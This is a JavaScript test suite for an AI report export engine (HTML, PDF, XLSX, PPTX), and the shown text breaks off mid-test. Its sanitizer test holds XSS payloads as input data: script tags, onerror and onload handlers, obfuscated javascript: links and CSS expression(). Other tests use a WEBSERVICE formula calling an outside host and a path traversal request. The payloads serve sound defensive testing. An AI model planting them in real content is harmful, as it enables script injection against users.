'use strict';

/*
 * LCW AI Export Engine (AI Çıktı Oluşturma) — HTML/PDF/XLSX/PPTX.
 * Kapsam: tema, HTML ayrıştırıcı + temizleyici, sözleşmeler, normalize,
 * onarım döngüsü, dosya oluşturucular, AI Outputs deposu, route'lar,
 * Electron PDF köprüsü ve sohbet arayüzü kaynak sözleşmesi.
 */
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const XLSX = require('xlsx');

const ROOT = path.join(__dirname, '..');
const OUT = path.join(ROOT, 'server', 'lib', 'lcwai-output');
const theme = require(path.join(OUT, 'output-theme'));
const html = require(path.join(OUT, 'output-html'));
const contracts = require(path.join(OUT, 'output-contracts'));
const templates = require(path.join(OUT, 'output-templates'));
const { renderWorkbook } = require(path.join(OUT, 'output-xlsx'));
const { renderPresentation } = require(path.join(OUT, 'output-pptx'));
const { createOutputStore, safeFileBase, fileNameFor } = require(path.join(OUT, 'output-store'));
const { createOutputService, MAX_REPAIRS } = require(path.join(OUT, 'output-service'));
const { createZip, crc32 } = require(path.join(OUT, 'output-zip'));

const tempDir = () => fs.mkdtempSync(path.join(os.tmpdir(), 'bl-ai-out-'));
const unzip = buffer => {
  const cfb = XLSX.CFB.read(buffer, { type: 'buffer' });
  const files = {};
  cfb.FullPaths.forEach((name, index) => { const entry = cfb.FileIndex[index]; if (entry && entry.type === 2) files[name.replace(/^Root Entry\//, '')] = Buffer.from(entry.content).toString('utf8'); });
  return files;
};
const xmlWellFormed = xml => {
  // Basit denge denetimi: her açılan etiket kapanır (OOXML parçaları için yeterli).
  const stack = [];
  const re = /<(\/?)([A-Za-z_][\w:.-]*)((?:\s+[^\s=>/]+\s*=\s*(?:"[^"]*"|'[^']*'))*)\s*(\/?)>/g;
  let match;
  while ((match = re.exec(xml.replace(/<\?xml[^>]*\?>/, '')))) {
    if (match[4]) continue;
    if (match[1]) { if (stack.pop() !== match[2]) return false; } else stack.push(match[2]);
  }
  return stack.length === 0;
};

/* ---------------- Tema ---------------- */
test('tema: renkler gerçek design.css anahtarlarından okunur; yazı tipleri gömülüdür, uzak kaynak yoktur', () => {
  const css = fs.readFileSync(path.join(ROOT, 'public', 'design.css'), 'utf8');
  const acc = /--acc:\s*(#[0-9a-fA-F]{6})/.exec(css)[1].toUpperCase();
  const t = theme.theme();
  assert.equal(t.source, 'design.css');
  assert.equal(t.colors.acc, acc);
  assert.equal(t.tones.risk, t.colors.red);
  const report = theme.reportCss({ orientation: 'landscape', print: true });
  assert.match(report, /@page\{size:A4 landscape/);
  assert.match(report, /font-family:"Barlow";[^}]*src:url\(data:font\/woff2;base64,/);
  assert.doesNotMatch(report.replace(/url\(data:[^)]*\)/g, ''), /url\(|https?:\/\//, 'yalnız data: kaynak');
  assert.equal(theme.readDesignTokens(':root{--acc:#123456;}\n[data-theme=dark]{--acc:#ffffff;}').acc, '#123456', 'ilk (açık tema) değer kazanır');
});

/* ---------------- HTML ayrıştırıcı ---------------- */
test('HTML ayrıştırıcı: doğrudan belge, ```html bloğu ve açıklama + blok biçimlerini tanır', () => {
  const direct = html.extractHtml('<!DOCTYPE html><html><body><h1>A</h1></body></html>');
  assert.equal(direct.mode, 'direct');
  const fence = html.extractHtml('```html\n<section><h1>Rapor</h1></section>\n```');
  assert.equal(fence.mode, 'fence');
  assert.equal(fence.html, '<section><h1>Rapor</h1></section>');
  const explained = html.extractHtml('İşte rapor:\n```html\n<div><h1>B</h1></div>\n```\nKontrol edin.');
  assert.equal(explained.mode, 'explained-fence');
  assert.equal(explained.explanation, 'İşte rapor:\n\nKontrol edin.');
  assert.equal(html.extractHtml('```\n<div><h1>Etiketsiz blok</h1></div>\n```').mode, 'fence');
  assert.equal(html.extractHtml('Yalnız düz metin cevabı.').ok, false);
  assert.equal(html.extractHtml('Not:\n<div><h2>Parça</h2></div>').mode, 'fragment');
});

test('HTML temizleyici: betik, iframe/object/embed, olay öznitelikleri, javascript:, uzak görsel ve CSS url() düşer', () => {
  const dirty = `<html><head><title>Sezon</title><meta http-equiv="refresh" content="0;url=http://x"><link rel="stylesheet" href="http://e/x.css"><base href="http://e/">
<style>@import url(http://e/a.css); body{background:url(http://e/t.png)} .x{color:red}</style><script>alert(1)</script></head>
<body onload="alert(1)"><h1 class="t" onclick="x()">Başlık</h1><iframe src="http://e"></iframe><object data="x"></object><embed src="x">
<img src="http://e/t.png"><img src="data:image/png;base64,iVBORw0KGgo=" alt="ok"><img src="data:image/svg+xml;base64,PHN2Zz4=">
<a href="javascript:alert(1)">a</a><a href="jav&#x61;script:alert(1)">b</a><a href="  javascript:alert(1)">c</a><a href="https://lcw.com/x">iyi</a>
<div style="background:url(javascript:1)">s</div><div style="width:40%">ok</div><div style="x:expression(alert(1))">e</div>
<svg viewBox="0 0 10 10"><script>alert(1)</script><foreignObject><iframe></iframe></foreignObject><rect width="5" height="5" onmouseover="x"/></svg>
<form action="http://x"><input name="a"><textarea>t</textarea><button>Gönder</button></form><table><tr><td>1 < 2</td></tr></table>
<template><script>alert(2)</script></template><noscript><img src=x onerror=alert(3)></noscript><!-- yorum --></body></html>`;
  const clean = html.sanitizeHtml(dirty);
  const body = clean.body;
  for (const bad of [/<script/i, /<iframe/i, /<object/i, /<embed/i, /<form/i, /<input/i, /<textarea/i, /<button/i, /<meta/i, /<link/i, /<base/i, /<foreignobject/i, /<template/i, /<noscript/i, /\son\w+=/i, /javascript:/i, /http:\/\/e/, /expression/i, /alert/]) assert.doesNotMatch(body, bad, String(bad));
  assert.match(body, /<h1 class="t">Başlık<\/h1>/);
  assert.match(body, /<img src="data:image\/png;base64,iVBORw0KGgo=" alt="ok">/);
  assert.doesNotMatch(body, /svg\+xml/, 'SVG data: görseli (betik taşıyabilir) kabul edilmez');
  assert.match(body, /<a href="https:\/\/lcw\.com\/x" target="_blank" rel="noopener noreferrer">iyi<\/a>/);
  assert.match(body, /<div style="width:40%">ok<\/div>/);
  assert.match(body, /<svg viewBox="0 0 10 10"><rect width="5" height="5"><\/rect><\/svg>/);
  assert.match(body, /<td>1 &lt; 2<\/td>/);
  assert.equal(clean.title, 'Sezon');
  assert.deepEqual(clean.styles, ['body{background:none} .x{color:red}']);
  assert.ok(clean.removed >= 10);
});

test('HTML belge: katı CSP, Buyer Log teması ve başlık; AI gövdesi temizlenmiş hâliyle yer alır', () => {
  const doc = html.buildDocument({ body: '<h1>Rapor</h1><p>x</p>', styles: ['.a{color:red}'], title: 'Rapor <x>', lang: 'en', meta: { date: '2026-10-05', template: 'Executive Summary' } });
  assert.match(doc, /<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data:; font-src data:;[^"]*script-src 'none'">/);
  assert.match(doc, /<html lang="en">/);
  assert.match(doc, /<title>Rapor &lt;x&gt;<\/title>/);
  assert.match(doc, /Buyer Log · LCW AI Report/);
  assert.match(doc, /Verify figures against Buyer Log data/);
  assert.doesNotMatch(doc, /<script/i);
});

/* ---------------- Şablonlar + sözleşmeler ---------------- */
test('şablonlar istek metnine ve biçime göre otomatik seçilir', () => {
  assert.equal(templates.chooseTemplate('pdf', 'Bu verilerden yönetici özeti hazırla').key, 'executive');
  assert.equal(templates.chooseTemplate('pptx', 'SS26 ile SS27 sezonunu karşılaştır').key, 'comparison');
  assert.equal(templates.chooseTemplate('pdf', 'Backlog gecikmelerini raporla').key, 'operational');
  assert.equal(templates.chooseTemplate('html', 'Fiyat dağılımını analiz et').key, 'analysis');
  assert.equal(templates.chooseTemplate('xlsx', 'şunu dök').key, 'workbook');
  assert.equal(templates.chooseTemplate('pdf', 'merhaba').key, 'general');
  assert.equal(templates.chooseTemplate('pdf', 'analiz', 'executive').key, 'executive', 'açık seçim kazanır');
  assert.equal(templates.chooseTemplate('pdf', 'x', 'workbook').key, 'general', 'biçime uymayan açık seçim yok sayılır');
});

test('sözleşme talimatı her biçim için TR/EN üretilir; onarım mesajı hataları taşır', () => {
  const tpl = templates.TEMPLATES.executive;
  const pdf = contracts.buildInstruction({ format: 'pdf', template: tpl, orientation: 'landscape', detail: 'summary', lang: 'tr' });
  assert.match(pdf, /ÇIKTI SÖZLEŞMESİ: PDF/);
  assert.match(pdf, /A4 yatay PDF/);
  assert.match(pdf, /bl-kpis/);
  assert.match(pdf, /<script>, olay öznitelikleri/);
  assert.match(pdf, /rakam uydurma/);
  const xlsx = contracts.buildInstruction({ format: 'xlsx', template: templates.TEMPLATES.workbook, lang: 'en' });
  assert.match(xlsx, /WORKBOOK shape/);
  assert.match(xlsx, /percent values are fractions/);
  const pptx = contracts.buildInstruction({ format: 'pptx', template: tpl, lang: 'en' });
  assert.match(pptx, /PRESENTATION shape/);
  assert.match(pptx, /title → kpis/);
  const repair = contracts.repairMessage({ format: 'pptx', errors: ['"slides" en az bir slayt içermeli.'], lang: 'tr' });
  assert.match(repair, /"slides" en az bir slayt içermeli/);
  assert.match(repair, /YALNIZ tek bir geçerli JSON/);
  assert.equal(contracts.normalizeFormat('Excel'), 'xlsx');
  assert.equal(contracts.normalizeFormat('powerpoint'), 'pptx');
  assert.equal(contracts.normalizeFormat('docx'), null);
});

test('WORKBOOK normalize: nesne satırlar, yüzde ölçeği, para/sayı metni, güvenli formül, sayfa adı', () => {
  const parsed = contracts.parseOutput('xlsx', 'Hazır:\n```json\n' + JSON.stringify({
    title: 'Analiz', sheets: [
      { name: 'Veri/2026: [Ana]*?', columns: [{ header: 'Kod', type: 'text' }, { header: 'Oran', type: 'percent' }, { header: 'Tutar', type: 'currency' }, { header: 'Tür', type: 'garip' }],
        rows: [['A', 25, '1.234,50 TL', 'x'], ['B', '%30', '99', 'y'], ['T', null, { f: 'SUM(C2:C3)' }, { f: 'WEBSERVICE("http://x")' }]] },
      { name: 'Nesne', rows: [{ Ad: 'x', Adet: 3 }, { Ad: 'y', Adet: 4 }] },
    ],
  }) + ',\n```', { lang: 'tr' });
  assert.equal(parsed.ok, true, parsed.errors.join());
  assert.equal(parsed.explanation, 'Hazır:');
  const [first, second] = parsed.data.sheets;
  assert.equal(first.name, 'Veri 2026 Ana');
  assert.equal(first.columns[3].type, 'text');
  assert.deepEqual(first.rows.map(row => row[1]), [0.25, 0.3, null]);
  assert.equal(first.rows[0][2], 1234.5);
  assert.deepEqual(first.rows[2][2], { f: 'SUM(C2:C3)' });
  assert.equal(first.rows[2][3], null, 'dış veri çağıran formül düşer');
  assert.deepEqual(second.columns.map(column => column.header), ['Ad', 'Adet']);
  assert.deepEqual(second.rows, [['x', 3], ['y', 4]]);
  const bad = contracts.parseOutput('xlsx', 'Üzgünüm, Excel üretemem.', { lang: 'tr' });
  assert.equal(bad.ok, false);
  assert.match(bad.errors[0], /JSON/);
  assert.equal(contracts.parseOutput('xlsx', '{"title":"x","sheets":[]}').ok, false);
});

test('PRESENTATION normalize: düzen çıkarımı, başlık slaytı, sınırlar; çoğunluğu bozuk sunum onarıma gider', () => {
  const deck = contracts.parseOutput('pptx', JSON.stringify({
    title: 'Sezon', slides: [
      { title: 'Grafik', chart: { categories: ['A', 'B'], series: [{ name: 'Gün', values: ['12', 7] }] } },
      { layout: 'table', title: 'Tablo', table: { columns: ['K', 'V'], rows: Array.from({ length: 20 }, (_, i) => [`R${i}`, i]) } },
      { layout: 'bullets', title: 'Madde', bullets: Array.from({ length: 12 }, (_, i) => `madde ${i}`) },
      { layout: 'kpis', title: 'Boş KPI', kpis: [] },
    ],
  }), { lang: 'tr' });
  assert.equal(deck.ok, true, deck.errors.join());
  const slides = deck.data.slides;
  assert.equal(slides[0].layout, 'title');
  assert.equal(slides[1].layout, 'chart');
  assert.deepEqual(slides[1].chart.series[0].values, [12, 7]);
  assert.equal(slides[2].table.rows.length, contracts.LIMITS.tableRows);
  assert.equal(slides[2].table.omitted, 8);
  assert.equal(slides[3].bullets.length, contracts.LIMITS.bullets);
  assert.equal(slides.length, 4, 'tek bozuk slayt düşer, sunum düşmez');
  assert.ok(deck.warnings.some(item => item.startsWith('slide-dropped')));
  const broken = contracts.parseOutput('pptx', JSON.stringify({ slides: [{ layout: 'kpis', kpis: [] }, { layout: 'table' }, { layout: 'chart' }] }));
  assert.equal(broken.ok, false);
  assert.equal(broken.errors.length, 3);
});

test('HTML normalize: görünür içeriği olmayan cevap onarıma gider; başlık h1/title’dan alınır', () => {
  const ok = contracts.parseOutput('pdf', '```html\n<h1>Gecikme Raporu</h1><p>' + 'Gecikmelerin çoğu iplik tedarikinden kaynaklanıyor. '.repeat(3) + '</p>\n```');
  assert.equal(ok.ok, true);
  assert.equal(ok.data.title, 'Gecikme Raporu');
  const empty = contracts.parseOutput('html', '```html\n<div><script>alert(1)</script></div>\n```');
  assert.equal(empty.ok, false);
});

/* ---------------- Dosya oluşturucular ---------------- */
test('ZIP yazıcı: CRC32 doğru, SheetJS/CFB ile geri okunur', () => {
  assert.equal(crc32(Buffer.from('123456789')), 0xCBF43926);
  const files = unzip(createZip([{ name: 'a.txt', data: 'merhaba ğüşİ' }, { name: 'dir/b.xml', data: '<x/>'.repeat(200) }]));
  assert.equal(files['a.txt'], 'merhaba ğüşİ');
  assert.equal(files['dir/b.xml'], '<x/>'.repeat(200));
});

test('XLSX: Buyer Log stilli başlık, dondurulmuş satır, filtre, tipli hücreler; Excel okuyucusuyla geri okunur', () => {
  const workbook = contracts.normalizeWorkbook({
    title: 'Backlog', subtitle: 'SS27', currency: 'TRY', kpis: [{ label: 'Toplam', value: 148 }], notes: ['Demo'],
    sheets: [{ name: 'Gecikmeler', columns: [{ header: 'Sipariş', type: 'text' }, { header: 'Adet', type: 'integer' }, { header: 'Oran', type: 'percent' }, { header: 'Termin', type: 'date' }],
      rows: [['PO-1 <&>', 1200, 0.12, '2026-11-02'], ['PO-2', 800, 0.3, '2026-11-09'], ['Toplam', { f: 'SUM(B2:B3)' }, null, null]] }],
  }, { lang: 'tr', date: '2026-10-05' }).data;
  const buffer = renderWorkbook(workbook, { lang: 'tr', date: new Date('2026-10-05T10:00:00Z') });
  const read = XLSX.read(buffer, { type: 'buffer', cellDates: false, sheetStubs: true });
  assert.deepEqual(read.SheetNames, ['Özet', 'Gecikmeler']);
  const rows = XLSX.utils.sheet_to_json(read.Sheets.Gecikmeler, { header: 1, raw: true });
  assert.deepEqual(rows[0], ['Sipariş', 'Adet', 'Oran', 'Termin']);
  assert.deepEqual(rows[1], ['PO-1 <&>', 1200, 0.12, 46328]);
  assert.equal(read.Sheets.Gecikmeler.B4.f, 'SUM(B2:B3)');
  const files = unzip(buffer);
  for (const [name, xml] of Object.entries(files)) if (name.endsWith('.xml') || name.endsWith('.rels')) assert.ok(xmlWellFormed(xml), `${name} iyi biçimli`);
  const acc = theme.ooxml(theme.theme().colors.acc);
  assert.match(files['xl/styles.xml'], new RegExp(`<fgColor rgb="FF${acc}"/>`));
  assert.match(files['xl/worksheets/sheet2.xml'], /<pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"\/>/);
  assert.match(files['xl/worksheets/sheet2.xml'], /<autoFilter ref="A1:D4"\/>/);
  assert.match(files['xl/workbook.xml'], /_xlnm\._FilterDatabase" localSheetId="1" hidden="1">'Gecikmeler'!\$A\$1:\$D\$4/);
  assert.match(files['xl/workbook.xml'], /<calcPr calcId="191029" fullCalcOnLoad="1"\/>/, 'formüller açılışta hesaplanır');
  assert.match(files['docProps/core.xml'], /<dc:creator>Buyer Log · LCW AI<\/dc:creator>/);
});

test('PPTX: geçerli PresentationML paketi, Buyer Log teması, her düzen çizilir', () => {
  const deck = contracts.normalizePresentation({
    title: 'SS27 Sezon', subtitle: 'Demo', slides: [
      { layout: 'kpis', title: 'Özet', kpis: [{ label: 'Model', value: '148' }, { label: 'Geciken', value: '23', tone: 'risk' }], bullets: ['Not'] },
      { layout: 'chart', title: 'Grafik', chart: { categories: ['A', 'B'], series: [{ name: 'X', values: [3, 1] }, { name: 'Y', values: [2, 2] }], unit: '%' }, bullets: ['İçgörü'] },
      { layout: 'table', title: 'Tablo', table: { columns: ['K', 'Adet', 'Termin'], rows: [['a & b', 1200, '02.11.2026']] } },
      { layout: 'comparison', title: 'Kıyas', left: { title: 'SS26', bullets: ['x'] }, right: { title: 'SS27', bullets: ['y'] } },
      { layout: 'section', title: 'Aksiyonlar' },
      { layout: 'summary', title: 'Adımlar', bullets: ['bir', 'iki'], callout: { text: 'Hedef', tone: 'warn' } },
    ],
  }, { lang: 'tr', date: '2026-10-05' }).data;
  const files = unzip(renderPresentation(deck, { lang: 'tr', date: new Date('2026-10-05T10:00:00Z') }));
  for (const part of ['[Content_Types].xml', '_rels/.rels', 'ppt/presentation.xml', 'ppt/_rels/presentation.xml.rels', 'ppt/slideMasters/slideMaster1.xml', 'ppt/slideLayouts/slideLayout1.xml', 'ppt/theme/theme1.xml', 'ppt/presProps.xml', 'ppt/viewProps.xml', 'ppt/tableStyles.xml', 'docProps/core.xml', 'docProps/app.xml']) assert.ok(files[part], part);
  assert.equal(Object.keys(files).filter(name => /^ppt\/slides\/slide\d+\.xml$/.test(name)).length, 7);
  for (const [name, xml] of Object.entries(files)) assert.ok(xmlWellFormed(xml), `${name} iyi biçimli`);
  for (let i = 1; i <= 7; i++) assert.match(files['[Content_Types].xml'], new RegExp(`/ppt/slides/slide${i}\\.xml`));
  const acc = theme.ooxml(theme.theme().colors.acc);
  assert.match(files['ppt/theme/theme1.xml'], new RegExp(`<a:accent1><a:srgbClr val="${acc}"/>`));
  assert.match(files['ppt/presentation.xml'], /<p:sldSz cx="12192000" cy="6858000"\/>/);
  assert.match(files['ppt/slides/slide1.xml'], /SS27 Sezon/);
  assert.match(files['ppt/slides/slide4.xml'], /<a:tbl>/);
  assert.match(files['ppt/slides/slide4.xml'], /a &amp; b/);
  assert.doesNotMatch(files['ppt/slides/slide4.xml'], /algn="r"\/><a:r><a:rPr[^>]*><a:solidFill><a:srgbClr val="[0-9A-F]+"\/><\/a:solidFill><a:latin[^>]*\/><a:cs[^>]*\/><\/a:rPr><a:t>02\.11\.2026/, 'tarih sağa yaslanmaz');
  assert.match(files['ppt/slides/slide3.xml'], /name="Bar \d+"/);
  assert.match(files['ppt/slides/slide7.xml'], /2\.  iki/);
});

/* ---------------- Depo ---------------- */
test('AI Outputs deposu: anlamlı/güvenli ad, çakışma eki, sahip izolasyonu, sırsız metadata', () => {
  assert.equal(safeFileBase('Rapor: Q4/2026 <SS27>?*'), 'Rapor Q4 2026 SS27');
  assert.equal(safeFileBase('CON'), '_CON');
  assert.equal(safeFileBase('  ...  '), 'LCW AI');
  assert.equal(fileNameFor('Gecikme Raporu', 'pdf', new Date('2026-10-05T12:00:00Z')), 'Gecikme Raporu - 2026-10-05.pdf');
  const dir = tempDir();
  const root = path.join(dir, 'ai-outputs');
  const store = createOutputStore({ root, now: () => new Date('2026-10-05T12:00:00Z') });
  const first = store.save('u1', { buffer: Buffer.from('a'), title: 'Gecikme Raporu', format: 'xlsx', template: 'operational', templateLabel: 'Operasyon Raporu' });
  const second = store.save('u1', { buffer: Buffer.from('b'), title: 'Gecikme Raporu', format: 'xlsx' });
  assert.equal(first.fileName, 'Gecikme Raporu - 2026-10-05.xlsx');
  assert.equal(second.fileName, 'Gecikme Raporu - 2026-10-05 (2).xlsx');
  assert.equal(fs.readFileSync(path.join(root, second.fileName), 'utf8'), 'b');
  assert.equal(store.get('u2', first.id), null, 'başka kullanıcının dosyası açılmaz');
  assert.equal(store.get('u1', first.id).path, path.join(root, first.fileName));
  assert.deepEqual(store.list('u1').map(item => item.fileName), [second.fileName, first.fileName]);
  const index = fs.readFileSync(store.indexFile(), 'utf8');
  assert.equal(path.dirname(store.indexFile()), dir, 'metadata kullanıcı klasörünün dışında');
  assert.doesNotMatch(index, /token|authorization|bearer|prompt|refresh/i);
  // Elle değiştirilmiş metadata klasör dışına çıkaramaz.
  const list = JSON.parse(index);
  list[0].path = path.join(dir, 'evil.txt');
  fs.writeFileSync(path.join(dir, 'evil.txt'), 'x');
  fs.writeFileSync(store.indexFile(), JSON.stringify(list));
  assert.equal(store.get('u1', list[0].id), null);
});

/* ---------------- Servis (onarım döngüsü) ---------------- */
function fakeEngine(answers) {
  const calls = [];
  return {
    calls,
    async chat(owner, input) {
      calls.push({ owner, chatId: input.chatId || null, message: input.message, outputInstruction: input.outputInstruction || '' });
      if (input.onProgress) input.onProgress({ phase: 'streaming', delta: 'x', chars: 1 });
      const text = answers[Math.min(calls.length - 1, answers.length - 1)];
      return { requestId: input.requestId || 'r1', chatId: 'chat-1', text, model: { key: 'gpt-6-sol', label: 'GPT-6 Sol' }, finishReason: 'stop', modules: [] };
    },
  };
}
const WORKBOOK = JSON.stringify({ title: 'Gecikme Listesi', sheets: [{ name: 'Liste', columns: ['Sipariş', 'Gün'], rows: [['PO-1', 3]] }] });

test('servis: geçerli cevap tek denemede dosyaya dönüşür; talimat sohbete eklenir; ilerleme aşamaları yayınlanır', async () => {
  const engine = fakeEngine([`Excel hazır.\n\`\`\`json\n${WORKBOOK}\n\`\`\``]);
  const service = createOutputService({ engine, storeOptions: { root: path.join(tempDir(), 'ai-outputs') } });
  const events = [];
  const result = await service.create('u1', { requestId: 'r1', message: 'Gecikmeleri listele', lang: 'tr', output: { format: 'xlsx' }, onProgress: event => events.push(event) });
  assert.equal(engine.calls.length, 1);
  assert.match(engine.calls[0].outputInstruction, /ÇIKTI SÖZLEŞMESİ: Excel/);
  assert.equal(result.chatId, 'chat-1');
  assert.equal(result.text, 'Excel hazır.');
  assert.equal(result.output.format, 'xlsx');
  assert.equal(result.output.attempts, 1);
  assert.match(result.output.fileName, /^Gecikme Listesi - \d{4}-\d{2}-\d{2}\.xlsx$/);
  assert.ok(fs.existsSync(result.output.path));
  assert.deepEqual(events.filter(event => event.phase === 'output').map(event => event.step), ['generating', 'rendering']);
  assert.ok(events.some(event => event.phase === 'streaming' && event.output === true), 'akış olayları dosya modunda işaretli');
});

test('servis: geçersiz cevapta AYNI sohbette onarım ister; en fazla MAX_REPAIRS sonra kodlu hata', async () => {
  const repaired = fakeEngine(['Üzgünüm, tablo veremem.', WORKBOOK]);
  const service = createOutputService({ engine: repaired, storeOptions: { root: path.join(tempDir(), 'ai-outputs') } });
  const result = await service.create('u1', { message: 'liste', output: { format: 'xlsx' } });
  assert.equal(repaired.calls.length, 2);
  assert.equal(repaired.calls[1].chatId, 'chat-1', 'onarım aynı sohbette');
  assert.match(repaired.calls[1].message, /YALNIZ tek bir geçerli JSON/);
  assert.equal(repaired.calls[1].outputInstruction, '', 'onarımda bağlam/talimat tekrar gönderilmez');
  assert.equal(result.output.attempts, 2);

  const never = fakeEngine(['hayır']);
  const failing = createOutputService({ engine: never, storeOptions: { root: path.join(tempDir(), 'ai-outputs') } });
  await assert.rejects(failing.create('u1', { message: 'x', output: { format: 'pptx' } }), error => error.code === 'LCWAI_OUTPUT_INVALID');
  assert.equal(never.calls.length, 1 + MAX_REPAIRS);
  await assert.rejects(failing.create('u1', { message: 'x', output: { format: 'docx' } }), error => error.code === 'LCWAI_BAD_REQUEST');
});

test('servis: PDF bekleyen HTML döner; yalnız gerçek PDF baytları kaydedilir; kabuk yoksa HTML’e düşer', async () => {
  const body = '```html\n<h1>Yönetici Özeti</h1><p>' + 'Sezon genel olarak hedefte ilerliyor. '.repeat(4) + '</p><script>alert(1)</script>\n```';
  const service = createOutputService({ engine: fakeEngine([body]), storeOptions: { root: path.join(tempDir(), 'ai-outputs') } });
  const result = await service.create('u1', { message: 'yönetici özeti', output: { format: 'pdf', orientation: 'landscape' } });
  assert.equal(result.output.pending, 'pdf');
  assert.equal(result.output.landscape, true);
  assert.match(result.output.html, /Content-Security-Policy/);
  assert.match(result.output.html, /@page\{size:A4 landscape/);
  assert.doesNotMatch(result.output.html, /<script/);
  assert.throws(() => service.completePdf('u2', result.output.pendingId, Buffer.from('%PDF-1.7\n'.padEnd(100, 'x'))), error => error.code === 'LCWAI_OUTPUT_NOT_FOUND');
  assert.throws(() => service.completePdf('u1', result.output.pendingId, Buffer.from('<html>'.padEnd(100, 'x'))), error => error.code === 'LCWAI_OUTPUT_RENDER_FAILED');
  const record = service.completePdf('u1', result.output.pendingId, Buffer.from('%PDF-1.7\n'.padEnd(100, 'x')));
  assert.equal(record.format, 'pdf');
  assert.match(record.fileName, /^Yönetici Özeti - .*\.pdf$/);
  assert.throws(() => service.completePdf('u1', result.output.pendingId, Buffer.from('%PDF-1.7\n'.padEnd(100, 'x'))), error => error.code === 'LCWAI_OUTPUT_NOT_FOUND', 'bekleyen bir kez tüketilir');
  const again = await service.create('u1', { message: 'yönetici özeti', output: { format: 'pdf' } });
  const fallback = service.fallbackHtml('u1', again.output.pendingId);
  assert.equal(fallback.format, 'html');
  assert.match(fs.readFileSync(fallback.path, 'utf8'), /Content-Security-Policy/);
});

test('motor: çıktı sözleşmesi istemin EN SONUNA eklenir ve kırpmada korunur', async () => {
  const { createLcwAiEngine } = require('../server/lib/lcwai/lcwai-engine');
  const sent = [];
  const engine = createLcwAiEngine({
    auth: { status: () => ({}) },
    client: { async sendMessage(owner, input) { sent.push(input); return { text: 'ok', metadata: { chatId: 'c1' }, modelKey: 'gpt-6-sol' }; } },
  });
  const huge = { label: 'CP', screen: 'cp', columns: ['A'], rows: Array.from({ length: 400 }, (_, i) => [`${'x'.repeat(180)}${i}`]), totalRows: 400 };
  await engine.chat('u1', { message: 'Rapor hazırla', contexts: [huge, huge, huge], outputInstruction: '=== ÇIKTI SÖZLEŞMESİ: PDF dosyası ===\nSON' });
  assert.ok(sent[0].content.endsWith('=== ÇIKTI SÖZLEŞMESİ: PDF dosyası ===\nSON'));
  assert.ok(sent[0].content.length <= require('../server/lib/lcwai/lcwai-config').LIMITS.maxPromptChars);
  await engine.chat('u1', { message: 'Normal soru', chatId: 'c1' });
  assert.doesNotMatch(sent[1].content, /SÖZLEŞMESİ/, 'normal sohbet etkilenmez');
});

/* ---------------- Route'lar ---------------- */
test('routes: chat+output servis yolunu kullanır; dosyalara yalnız kimlikle ulaşılır; PDF yükleme', async () => {
  const express = require('express');
  const app = express();
  app.use((req, res, next) => { req.currentUser = { id: 'u1' }; next(); });
  const dir = tempDir();
  const service = createOutputService({ engine: fakeEngine([WORKBOOK]), storeOptions: { root: path.join(dir, 'ai-outputs') } });
  const opened = [];
  const platform = { openPathExternallyAsync: file => { opened.push(['open', file]); return true; }, revealFileExternally: file => { opened.push(['reveal', file]); return true; } };
  const engine = { async chat() { return { text: 'normal', chatId: 'c' }; }, cancel() { return true; } };
  const audits = [];
  require('../server/routes/lcwai-routes')(app, { express, userAccess: { appendAudit: (...args) => audits.push(args) }, engine, outputService: service, platform });
  const server = app.listen(0, '127.0.0.1');
  await new Promise(resolve => server.once('listening', resolve));
  const base = `http://127.0.0.1:${server.address().port}`;
  const post = (url, body, headers = { 'Content-Type': 'application/json' }) => fetch(`${base}${url}`, { method: 'POST', headers, body });
  try {
    const events = (await (await post('/api/lcwai/chat', JSON.stringify({ message: 'liste', output: { format: 'xlsx' } }))).text()).trim().split('\n').map(line => JSON.parse(line));
    const result = events.at(-1);
    assert.equal(result.type, 'result');
    assert.equal(result.result.output.format, 'xlsx');
    const plain = (await (await post('/api/lcwai/chat', JSON.stringify({ message: 'soru' }))).text()).trim().split('\n').map(line => JSON.parse(line));
    assert.equal(plain.at(-1).result.text, 'normal');
    const id = result.result.output.id;
    assert.deepEqual(await (await post(`/api/lcwai/outputs/${id}/open`, '{}')).json(), { ok: true });
    assert.deepEqual(await (await post(`/api/lcwai/outputs/${id}/reveal`, '{}')).json(), { ok: true });
    assert.deepEqual(opened.map(item => item[0]), ['open', 'reveal']);
    assert.ok(opened.every(item => item[1] === result.result.output.path));
    const missing = await post('/api/lcwai/outputs/../../etc/open', '{}');
    assert.equal(missing.status, 404);
    const unknown = await post('/api/lcwai/outputs/deadbeef/open', '{}');
    assert.equal((await unknown.json()).code, 'LCWAI_OUTPUT_NOT_FOUND');
    const list = await (await fetch(`${base}/api/lcwai/outputs`)).json();
    assert.equal(list.outputs.length, 1);
    // PDF tamamlama
    const pdfService = createOutputService({ engine: fakeEngine(['```html\n<h1>Rapor</h1><p>' + 'yeterli görünür içerik '.repeat(5) + '</p>\n```']), storeOptions: { root: path.join(dir, 'ai-outputs') } });
    const pending = await pdfService.create('u1', { message: 'rapor', output: { format: 'pdf' } });
    const app2 = express();
    app2.use((req, res, next) => { req.currentUser = { id: 'u1' }; next(); });
    require('../server/routes/lcwai-routes')(app2, { express, userAccess: { appendAudit() {} }, engine, outputService: pdfService, platform });
    const server2 = app2.listen(0, '127.0.0.1');
    await new Promise(resolve => server2.once('listening', resolve));
    try {
      const base2 = `http://127.0.0.1:${server2.address().port}`;
      const saved = await (await fetch(`${base2}/api/lcwai/outputs/${pending.output.pendingId}/pdf`, { method: 'POST', headers: { 'Content-Type': 'application/pdf' }, body: Buffer.from('%PDF-1.7\n'.padEnd(200, 'x')) })).json();
      assert.equal(saved.ok, true);
      assert.equal(saved.output.format, 'pdf');
    } finally { server2.close(); }
    assert.ok(audits.every(([, action, , details]) => /^LCWAI_/.test(action) && !JSON.stringify(details).includes('liste')), 'audit istek metnini yazmaz');
  } finally { server.close(); }
});

/* ---------------- Masaüstü köprüsü + arayüz kaynak sözleşmesi ---------------- */
test('Electron: render-pdf JS kapalı, ağ engelli, güvenilir göndericili; preload yalnız HTML+yön alır', () => {
  const main = fs.readFileSync(path.join(ROOT, 'electron', 'main.js'), 'utf8');
  const handler = main.slice(main.indexOf("ipcMain.handle('buyerlog:render-pdf'"), main.indexOf("ipcMain.handle('buyerlog:render-pdf'") + 700);
  assert.match(handler, /trustedBuyerLogIpcSender\(event\)/);
